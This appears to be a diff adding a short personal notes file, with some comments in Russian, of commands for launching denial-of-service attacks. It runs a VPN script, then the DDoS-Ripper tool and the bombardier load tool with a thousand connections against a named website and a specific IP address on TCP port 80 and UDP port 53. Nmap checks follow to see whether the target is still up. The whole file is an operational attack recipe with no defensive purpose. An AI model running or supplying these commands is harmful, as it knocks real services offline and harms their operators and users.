@@ -1,0 +1,22 @@
+VPN
+cd /usr/local/bin 
+sudo gedit autovpn3.sh 
+sudo chmod +x autovpn3.sh
+sudo autovpn3.sh  
+** sudo autovpn3.sh EN --open vpn **
+
+python huck
+cd DDoS-Ripper
+python3 DRipper.py -s (IP ADRESS) -p (port) -t(time)135 -q(quantity) 10000
+
+//https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)
+
+docker run -ti alpine/bombardier -c 1000 -d 01s -l https://www.virtuaka.com
+
+docker run -ti alpine/bombardier -c 1000 -d 2m -l 62.76.145.9:80 for (80/tcp) 
+
+-l 62.76.145.9:53/UDP 
+
+sudo nmap -sT -Pn -p 80 62.76.145.9 //проверка рабочий сайт или нет |для tcp|
+
+sudo nmap -sU -Pn -p 53 62.76.145.9 //UDP                           |для udp|
